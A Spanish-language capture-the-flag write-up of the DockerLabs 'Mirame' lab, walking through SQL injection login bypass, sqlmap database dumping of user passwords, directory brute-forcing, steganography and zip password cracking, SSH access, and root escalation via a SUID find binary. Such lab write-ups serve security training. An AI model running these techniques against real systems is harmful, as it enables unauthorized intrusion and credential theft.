---
title: DockerLabs - Mirame
summary: "Write-up del laboratorio Mirame de DockerLabs"
author: elcybercurioso
date: 2025-11-09
categories: [Post, DockerLabs]
tags: [fácil, sqli, stenography, brute force, suid]
media_subpath: "/assets/img/posts/dockerlabs_mirame"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ nmap -sCV -p22,80 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Login Page
|_http-server-header: Apache/2.4.61 (Debian)
```

## análisis

Nos encontramos con un panel de login en la pantalla principal:

![Desktop View](/20251109122700.webp){: width="410" height="330" .shadow}

Al intentar provocar un error metiendo una comilla simple, nos damos cuenta que salta un error de SQL:

![Desktop View](/20251109122735.webp){: width="972" height="589" .shadow}

Probamos a usar payloads de SQL Injection básicos para ver si podemos saltárnos el panel:

![Desktop View](/20251109122802.webp){: width="410" height="330" .shadow}

Vemos que efectivamente hemos podido saltárnoslo:

![Desktop View](/20251109122819.webp){: width="410" height="330" .shadow}

Lo que nos encontramos ahora es una funcionalidad que, lo que introduzcamos en el campo editable, se verá reflejado en un campo más abajo:

![Desktop View](/20251109122838.webp){: width="410" height="330" .shadow}

## explotación

Probamos si es vulnerable a **XSS** (Cross-Site Scripting) o **SSTI** (Server-Side Template Injection), pero no parece ser el caso.

Por ello, volvemos al panel de login, ya que empleando una petición de login interceptada con Burp Suite y guardada en un fichero .txt, podemos llegar a obtener información de la base de datos usando `sqlmap`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ sqlmap -r request.txt --dbs --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
[11:43:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[11:43:42] [INFO] fetching database names
[11:43:42] [INFO] retrieved: 'information_schema'
[11:43:42] [INFO] retrieved: 'users'
available databases [2]:
[*] information_schema
[*] users
```

Una vez obtenidas las bases de datos existentes, procedemos a obtener las tablas de la base de datos que nos interesa, que en este caso es `users`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ sqlmap -r request.txt -D users --tables --batch
        ___
       __H__                                                                                                                                                            
 ___ ___[']_____ ___ ___  {1.9.9#stable}                                                                                                                                
|_ -| . [(]     | .'| . |                                                                                                                                               
|___|_  [(]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                            

[11:54:17] [INFO] fetching tables for database: 'users'
[11:54:17] [INFO] retrieved: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

Sabemos que la tabla que nos interesa es `usuarios`, la cual pertenece a la base de datos `users`, pero todavía nos faltan las columnas de dicha tabla:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ sqlmap -r request.txt -D users -T usuarios --columns --batch
        ___
       __H__                                                                                                                                                            
 ___ ___[)]_____ ___ ___  {1.9.9#stable}                                                                                                                                
|_ -| . [']     | .'| . |                                                                                                                                               
|___|_  [)]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                            

[11:55:00] [INFO] fetching columns for table 'usuarios' in database 'users'
[11:55:00] [INFO] retrieved: 'id'
[11:55:00] [INFO] retrieved: 'int(11)'
[11:55:00] [INFO] retrieved: 'username'
[11:55:00] [INFO] retrieved: 'varchar(50)'
[11:55:00] [INFO] retrieved: 'password'
[11:55:00] [INFO] retrieved: 'varchar(255)'
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(50)  |
+----------+--------------+
```

Teniendo ya las columnas, procedemos a extraer toda la información de los usuarios:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ sqlmap -r request.txt -D users -T usuarios -C username,password --dump --batch
        ___
       __H__                                                                                                                                                            
 ___ ___[']_____ ___ ___  {1.9.9#stable}                                                                                                                                
|_ -| . [,]     | .'| . |                                                                                                                                               
|___|_  [`]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                            

[11:56:13] [INFO] fetching entries of column(s) 'password,username' for table 'usuarios' in database 'users'
[11:56:13] [INFO] retrieved: 'chocolateadministrador'
[11:56:13] [INFO] retrieved: 'admin'
[11:56:13] [INFO] retrieved: 'directoriotravieso'
[11:56:13] [INFO] retrieved: 'directorio'
[11:56:13] [INFO] retrieved: 'lucas'
[11:56:13] [INFO] retrieved: 'lucas'
[11:56:13] [INFO] retrieved: 'soyagustin123'
[11:56:13] [INFO] retrieved: 'agustin'
Database: users
Table: usuarios
[4 entries]
+------------+------------------------+
| username   | password               |
+------------+------------------------+
| admin      | chocolateadministrador |
| directorio | directoriotravieso     |
| lucas      | lucas                  |
| agustin    | soyagustin123          |
+------------+------------------------+
```

Una vez obtenida esta información, tratamos de loguearnos con algunas de estas credenciales, pero vemos que no es posible hacerlo.

Otra opción es guardar las cadenas en un fichero, y buscarlas como recursos del sistema:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ cat list.txt 
admin
directorio
lucas
agustin
chocolateadministrador
directoriotravieso
lucas
soyagustin123
```

Usaremos `gobuster` para buscar recursos existentes:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ gobuster dir -u "http://172.17.0.2" -w list.txt -t 200 -x .php,.txt,.html 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/directoriotravieso   (Status: 301) [Size: 321] [--> http://172.17.0.2/directoriotravieso/]
Progress: 32 / 32 (100.00%)
===============================================================
Finished
===============================================================
```

## acceso inicial (carlos)

Encontramos que el recurso `directoriotravieso` existe, y permite listar ficheros:

![Desktop View](/20251109132252.webp){: width="600" height="490" .shadow}

Nos guardamos el fichero `miramebien.jpg` en nuestro equipo para analizarlo:

![Desktop View](/20251109132332.webp){: width="972" height="589" .shadow}

Comprobamos los metadatos de la imagen empleando `exiftool`, la cual no nos desvela nada interesante:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ exiftool miramebien.jpg                                 
ExifTool Version Number         : 13.25
File Name                       : miramebien.jpg
Directory                       : .
File Size                       : 6.3 kB
File Modification Date/Time     : 2025:11:09 12:23:13+00:00
File Access Date/Time           : 2025:11:09 12:23:13+00:00
File Inode Change Date/Time     : 2025:11:09 12:23:13+00:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 243
Image Height                    : 207
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 243x207
Megapixels                      : 0.050
```

Seguimos investigando la imagen, pero ahora con `steghide`, la cual nos indica que para intentar extraer el contenido necesitamos una clave.

Dado que no poseemos dicha clave, usaremos `stegseek` para sacarla por fuerza bruta:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ stegseek --crack miramebien.jpg /usr/share/seclists/Passwords/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "c********"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien.jpg.out".
```

Pasado un tiempo, nos encuentra la cadena que permite extraer el archivo .zip oculto dentro de la imagen. Sin embargo, a la hora de descomprimirlo, vemos que también nos pide una clave.

Por ello, emplearemos `zip2john` para generar un hash del fichero, y con `john` trataremos de sacarla por fuerza bruta:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s******          (ocultito.zip/secret.txt)     
1g 0:00:00:00 DONE (2025-11-09 12:28) 16.66g/s 273066p/s 273066c/s 273066C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Procedemos a exportar el contenido del fichero .zip usando la clave que hemos encontrado:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ 7z x ocultito.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_GB.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 214 bytes (1 KiB)

Extracting archive: ocultito.zip
--
Path = ocultito.zip
Type = zip
Physical Size = 214

    
Enter password (will not be echoed):
Everything is Ok

Size:       16
Compressed: 214
```

Vemos que el fichero resultante contiene lo que parecen ser unas credenciales:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ cat secret.txt
carlos:c*******
```

Tratamos de conectarnos por SSH con las credenciales que hemos encontrado:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mirame]
└─$ ssh carlos@172.17.0.2                                                
carlos@172.17.0.2`s password: 
carlos@bda65844d0f6:~$ whoami
carlos
carlos@bda65844d0f6:~$ hostname -I
172.17.0.2
```

## escalada de privilegios (root)

Una vez dentro, buscamos binarios cuyos permisos sean SUID, los cuales nos permiten ejecutarlos con los permisos del propietario:

```bash
carlos@bda65844d0f6:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/find
/usr/bin/sudo
/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) nos indican que empleando el binario `find` con permisos SUID es posible obtener una consola como el propietario empleando el siguiente comando:

![Desktop View](/20251109133617.webp){: width="972" height="589" .shadow}

Ejecutamos el comando indicado, y ya nos habríamos convertido en el usuario `root`:

```bash
carlos@bda65844d0f6:~$ find . -exec /bin/bash -p \; -quit
bash-5.2# whoami
root
```

Y hasta aquí la resolución del laboratorio Mirame!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>